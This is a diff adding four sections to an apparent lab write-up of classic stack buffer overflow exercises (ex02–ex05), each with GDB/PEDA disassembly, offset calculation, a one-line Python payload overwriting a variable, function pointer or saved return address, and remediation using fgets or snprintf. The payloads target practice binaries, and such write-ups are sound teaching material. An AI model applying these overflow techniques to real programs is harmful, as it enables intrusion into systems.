@@ -291,3 +291,467 @@ be represented according to the target architecture's byte ordering.
 ```c
 snprintf(buffer, sizeof(buffer), "%s", input);
 ```
+
+## ex02 - Stack Buffer Overflow
+
+#### Objective
+
+Modify the `modified` variable to hold the specific hexadecimal value:
+
+```bash
+0x0d0a0d0a
+```
+
+The challenge is successfully completed when the program outputs:
+
+> `you have correctly modified the variable`
+
+---
+
+#### Analysis
+
+Analyzing the `main` function disassembly using **GDB/PEDA**:
+
+```assembly
+gdb-peda$ pd main
+
+0x08048494 <+0>:     push   ebp
+0x08048495 <+1>:     mov    ebp,esp
+0x08048497 <+3>:     and    esp,0xfffffff0
+0x0804849a <+6>:     sub    esp,0x60
+
+0x0804849d <+9>:     mov    DWORD PTR [esp],0x80485e0
+0x080484a4 <+16>:    call   0x804837c <getenv@plt>
+0x080484a9 <+21>:    mov    DWORD PTR [esp+0x5c],eax
+0x080484ad <+25>:    cmp    DWORD PTR [esp+0x5c],0x0
+0x080484b2 <+30>:    jne    0x80484c8 <main+52>
+
+0x080484c8 <+52>:    mov    DWORD PTR [esp+0x58],0x0
+
+0x080484d0 <+60>:    mov    eax,DWORD PTR [esp+0x5c]
+0x080484d4 <+64>:    mov    DWORD PTR [esp+0x4],eax
+0x080484d8 <+68>:    lea    eax,[esp+0x18]
+0x080484dc <+72>:    mov    DWORD PTR [esp],eax
+0x080484df <+75>:    call   0x804839c <strcpy@plt>
+
+0x080484e4 <+80>:    mov    eax,DWORD PTR [esp+0x58]
+0x080484e8 <+84>:    cmp    eax,0xd0a0d0a
+```
+
+**Stack Layout Observations:**
+
+* Destination buffer start: `esp + 0x18`
+* Target variable (`modified`) location: `esp + 0x58`
+
+**Offset Calculation:**
+
+```text
+0x58 - 0x18 = 0x40 = 64 bytes
+```
+
+---
+
+#### Vulnerability
+
+The binary reads user input from an environment variable (`GREENIE`) via `getenv()` and copies it into a fixed-size buffer at `esp + 0x18` using `strcpy()`. Because `strcpy()` does not check input bounds, passing an environment variable longer than 64 bytes overflows the destination buffer and directly overwrites the adjacent `modified` variable on the stack.
+
+---
+
+#### Exploitation
+
+**Target Value:** `0x0d0a0d0a`
+
+Because the binary runs on an x86 architecture (**Little-Endian** byte ordering), the hex bytes must be supplied in reverse order:
+
+```text
+\x0a \x0d \x0a \x0d
+```
+
+**Payload Structure:**
+
+```text
+[ 64 Bytes Padding ] + [ "\x0a\x0d\x0a\x0d" ]
+```
+
+**Proof of Concept (PoC):**
+
+```bash
+export GREENIE=$(python -c 'print "A" * 64 + "\x0a\x0d\x0a\x0d"')
+./bin
+```
+
+**Result:**
+
+```text
+you have correctly modified the variable
+```
+
+The first 64 bytes pad the space from the start of the buffer up to `modified`. The trailing `"\x0a\x0d\x0a\x0d"` overwrites `modified` with `0x0d0a0d0a`, satisfying the comparison check (`cmp eax, 0xd0a0d0a`).
+
+#### Key Takeaway
+
+This challenge demonstrates that buffer overflow vulnerabilities exist regardless of the input vector (environment variables vs command-line arguments). Input length must always be validated prior to copying into fixed-size stack buffers.
+
+---
+
+#### Remediation
+
+**Avoid Unsafe Copy Operations:** Replace `strcpy()` with bounded functions that enforce destination buffer limits, such as `snprintf()`:
+
+```c
+snprintf(buffer, sizeof(buffer), "%s", env_value);
+```
+
+
+
+## ex03 - Stack Buffer Overflow (Function Pointer Redirection)
+
+#### Objective
+
+Modify the function pointer variable located on the stack to point to the `win()` function address (`0x08048424`).
+
+The challenge is successfully completed when the program outputs:
+
+> `code flow successfully changed`
+
+---
+
+#### Analysis
+
+Analyzing the `main` function disassembly using **GDB/PEDA**:
+
+```assembly
+gdb-peda$ pd main
+
+0x08048438 <+0>:     push   ebp
+0x08048439 <+1>:     mov    ebp,esp
+0x0804843b <+3>:     and    esp,0xfffffff0
+0x0804843e <+6>:     sub    esp,0x60
+
+0x08048441 <+9>:     mov    DWORD PTR [esp+0x5c],0x0
+0x08048449 <+17>:    lea    eax,[esp+0x1c]
+0x0804844d <+21>:    mov    DWORD PTR [esp],eax
+0x08048450 <+24>:    call   0x8048330 <gets@plt>
+
+0x08048455 <+29>:    cmp    DWORD PTR [esp+0x5c],0x0
+0x0804845a <+34>:    je     0x8048477 <main+63>
+
+0x0804845c <+36>:    mov    eax,0x8048560
+0x08048461 <+41>:    mov    edx,DWORD PTR [esp+0x5c]
+0x08048465 <+45>:    mov    DWORD PTR [esp+0x4],edx
+0x08048469 <+49>:    mov    DWORD PTR [esp],eax
+0x0804846c <+52>:    call   0x8048350 <printf@plt>
+
+0x08048471 <+57>:    mov    eax,DWORD PTR [esp+0x5c]
+0x08048475 <+61>:    call   eax
+
+```
+
+**Stack Layout Observations:**
+
+* Destination buffer start: `esp + 0x1c`
+* Function pointer location: `esp + 0x5c`
+* Target function (`win`) address: `0x08048424`
+
+**Offset Calculation:**
+
+```text
+0x5c - 0x1c = 0x40 = 64 bytes
+```
+
+---
+
+#### Vulnerability
+
+The program initializes a function pointer at `esp + 0x5c` to `NULL` (`0x0`) and then calls `gets()` to read standard input into a fixed-size buffer at `esp + 0x1c`. Since `gets()` performs no boundary checks, writing past 64 bytes allows direct overwriting of the function pointer. When the program reaches `call eax` (`<main+61>`), execution jumps directly to whatever address is stored in `esp + 0x5c`.
+
+---
+
+#### Exploitation
+
+**Target Address (`win`):** `0x08048424`
+
+Because the binary runs on an x86 architecture (**Little-Endian** byte ordering), the target address bytes must be supplied in reverse order:
+
+```text
+\x24 \x84 \x04 \x08
+```
+
+**Payload Structure:**
+
+```text
+[ 64 Bytes Padding ] + [ "\x24\x84\x04\x08" ]
+```
+
+**Proof of Concept (PoC):**
+
+```bash
+python -c 'print "A" * 64 + "\x24\x84\x04\x08"' | ./bin
+```
+
+**Result:**
+
+```text
+calling function pointer, jumping to 0x08048424
+code flow successfully changed
+```
+
+The first 64 bytes pad the space up to the function pointer. The trailing bytes `\x24\x84\x04\x08` overwrite the pointer with the address of `win()`. When `call eax` is executed, control flow jumps to `win()`, printing `code flow successfully changed`.
+
+---
+
+#### Key Takeaway
+
+This challenge demonstrates how control flow can be hijacked directly by overwriting local function pointers on the stack, bypassing the need to overwrite the saved return address (`EIP`).
+
+---
+
+#### Remediation
+
+1. **Avoid `gets()` Entirely:** Never use `gets()` as it is intrinsically unsafe and deprecated. Replace it with `fgets()`:
+
+```c
+fgets(buffer, sizeof(buffer), stdin);
+```
+
+
+## ex04 - Stack Buffer Overflow (Ret2win / Return Address Overwrite)
+
+#### Objective
+
+Overwrite the saved instruction pointer (`Saved EIP`) on the stack to redirect execution control flow to the `win()` function address (`0x080483f4`).
+
+The challenge is successfully completed when the program outputs:
+
+> `code flow successfully changed`
+
+---
+
+#### Analysis
+
+Analyzing the `main` function disassembly using **GDB/PEDA**:
+
+```assembly
+gdb-peda$ pd main
+
+0x08048408 <+0>:     push   ebp
+0x08048409 <+1>:     mov    ebp,esp
+0x0804840b <+3>:     and    esp,0xfffffff0
+0x0804840e <+6>:     sub    esp,0x50
+0x08048411 <+9>:     lea    eax,[esp+0x10]
+0x08048415 <+13>:    mov    DWORD PTR [esp],eax
+0x08048418 <+16>:    call   0x804830c <gets@plt>
+0x0804841d <+21>:    leave  
+0x0804841e <+22>:    ret    
+
+```
+
+**Stack Layout Observations:**
+
+* Target function (`win`) address: `0x080483f4`
+* Buffer start location: `esp + 0x10`
+* Stack allocation size: `sub esp, 0x50` (80 bytes)
+
+---
+
+### Offset Calculation
+
+#### Calculating the EIP Offset with PEDA
+
+Instead of assuming the exact offset from the stack allocation, use PEDA's cyclic pattern to determine it dynamically and precisely.
+
+1. **Generate a pattern:**
+```text
+gdb-peda$ pattern create 100
+```
+
+
+2. **Run the program and supply the pattern as input:**
+```text
+gdb-peda$ run
+```
+
+
+*(Paste the generated pattern when prompted for input).*
+3. **Inspect the registers after the crash (`SIGSEGV`):**
+```text
+gdb-peda$ info registers eip
+```
+
+
+4. **Locate the exact offset of the overwritten address:**
+```text
+gdb-peda$ pattern search
+```
+
+**PEDA Output:**
+
+```text
+EIP+0 found at offset: 76
+```
+
+**Conclusion:**
+
+```text
+EIP Offset = 76 bytes
+```
+
+This dynamic approach provides the exact location of the saved return address (`Saved EIP`) directly from execution, accounting for any compiler structure or alignment padding.
+
+---
+
+#### Vulnerability
+
+The program uses the unsafe `gets()` function to read input into a fixed-size stack buffer without bounds checking. Overflowing the buffer past 76 bytes overwrites the saved return address (`Saved EIP`) stored on the stack. When `main()` executes `ret`, control flow jumps directly to the address provided in the payload.
+
+---
+
+#### Exploitation
+
+**Target Address (`win`):** `0x080483f4`
+
+Converted to x86 **Little-Endian** byte format:
+
+```text
+\xf4 \x83 \x04 \x08
+```
+
+**Payload Structure:**
+
+```text
+[ 76 Bytes Padding ] + [ "\xf4\x83\x04\x08" ]
+```
+
+**Proof of Concept (PoC):**
+
+```bash
+python -c 'print "A" * 76 + "\xf4\x83\x04\x08"' | ./bin
+```
+
+**Result:**
+
+```text
+code flow successfully changed
+```
+
+---
+
+#### Key Takeaway
+
+This represents a classic **Ret2win** stack buffer overflow. Overwriting the saved instruction pointer (`Saved EIP`) past local buffer bounds, alignment padding, and saved `EBP` allows direct redirection of the execution flow upon function return (`ret`).
+
+---
+
+#### Remediation
+
+Replace unsafe input functions like `gets()` with bounded functions such as `fgets()`:
+
+```c
+fgets(buffer, sizeof(buffer), stdin);
+```
+
+## ex05 - Format String / Stack Overflow via sprintf (format0)
+
+#### Objective
+
+Modify the local variable located at `ebp - 0xc` to hold the target hexadecimal value:
+
+```bash
+0xdeadbeef
+```
+
+The challenge is successfully completed when the program outputs:
+
+> `you have hit the target correctly :)`
+
+---
+
+#### Analysis
+
+Analyzing the `vuln` function disassembly using **GDB/PEDA**:
+
+```assembly
+gdb-peda$ pd vuln
+
+0x080483f4 <+0>:     push   ebp
+0x080483f5 <+1>:     mov    ebp,esp
+0x080483f7 <+3>:     sub    esp,0x68
+
+0x080483fa <+6>:     mov    DWORD PTR [ebp-0xc],0x0
+0x08048401 <+13>:    mov    eax,DWORD PTR [ebp+0x8]
+0x08048404 <+16>:    mov    DWORD PTR [esp+0x4],eax
+0x08048408 <+20>:    lea    eax,[ebp-0x4c]
+0x0804840b <+23>:    mov    DWORD PTR [esp],eax
+0x0804840e <+26>:    call   0x8048300 <sprintf@plt>
+
+0x08048413 <+31>:    mov    eax,DWORD PTR [ebp-0xc]
+0x08048416 <+34>:    cmp    eax,0xdeadbeef
+0x0804841b <+39>:    jne    0x8048429 <vuln+53>
+```
+
+**Stack Layout Observations:**
+
+* Target variable location: `ebp - 0xc`
+* Buffer start location: `ebp - 0x4c`
+
+---
+
+#### Offset Calculation
+
+##### Method 1: Mathematical Calculation
+
+1. Calculate the distance from the start of the buffer (`ebp - 0x4c`) to the target variable (`ebp - 0xc`):
+
+$$\text{Offset} = 0x4c - 0xc = 0x40 = 64 \text{ bytes}$$
+
+---
+
+#### Vulnerability
+
+The program passes user-controlled input (`argv[1]`) directly into `sprintf()` to format it into a local stack buffer (`ebp - 0x4c`) without restricting input length. Supplying a string longer than 64 bytes causes a buffer overflow that overwrites the adjacent local target variable (`ebp - 0xc`).
+
+---
+
+#### Exploitation
+
+**Target Value:** `0xdeadbeef`
+
+Converted to x86 **Little-Endian** byte format:
+
+```text
+\xef \xbe \xad \xde
+```
+
+**Payload Structure:**
+
+```text
+[ 64 Bytes Padding ] + [ "\xef\xbe\xad\xde" ]
+```
+
+**Proof of Concept (PoC):**
+
+```bash
+./bin $(python -c 'print "A" * 64 + "\xef\xbe\xad\xde"')
+```
+
+**Result:**
+
+```text
+you have hit the target correctly :)
+```
+
+---
+
+#### Key Takeaway
+
+Unbounded formatting functions like `sprintf()` do not perform length checking on destination buffers and are just as vulnerable to stack overflows as `strcpy()` or `gets()`.
+
+---
+
+#### Remediation
+
+Replace `sprintf()` with `snprintf()` to specify and enforce a maximum destination buffer size limit:
+
+```c
+snprintf(buffer, sizeof(buffer), "%s", input);
+```
